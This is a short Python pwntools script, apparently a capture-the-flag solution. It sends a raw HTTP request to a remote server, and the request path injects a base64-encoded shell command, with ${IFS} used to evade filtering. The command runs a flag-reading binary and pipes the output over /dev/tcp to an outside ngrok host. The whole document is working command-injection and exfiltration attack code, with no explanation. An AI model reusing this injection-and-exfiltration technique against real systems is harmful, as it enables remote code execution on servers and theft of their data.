#!/usr/bin/env python3
import base64
from pwn import remote


p = remote('45.147.230.214', 37527)
a = '/readflag gimmeflag > /dev/tcp/0.tcp.ap.ngrok.io/14120'
p.send(b"""GET /src:/lmao;echo${IFS}"""+base64.b64encode(a.encode())+b"""|base64${IFS}-d|bash HTTP/1.1
open-in-editor: 1
Host: dfdf

""".replace(b'\n', b'\r\n'))
# p.interactive()
print(p.recv())
p.close()
